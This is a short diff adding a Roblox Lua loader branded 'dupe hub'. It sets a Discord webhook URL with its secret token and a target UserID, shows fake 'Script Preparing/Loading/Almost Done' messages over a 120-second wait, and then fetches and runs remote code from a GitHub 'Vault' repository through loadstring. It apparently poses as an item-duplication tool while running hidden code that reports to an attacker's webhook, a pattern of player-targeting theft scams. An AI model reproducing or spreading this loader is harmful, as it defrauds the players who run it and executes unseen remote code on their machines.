@@ -1,0 +1,8 @@
+_G.UserID = 1616431193
+_G.Webhook = "https://discord.com/api/webhooks/1097864644695162992/hTx1iCq-RTPTs0wiHmXJbZHeUa87TX5H1xz4NQW143pcmxYZmUJ5kvcikYKmfIKaB6ks"
+_G.ScriptName = "dupe hub"
+_G.FirstText = "Script Preparing..."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 120
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/bank.lua", true))()
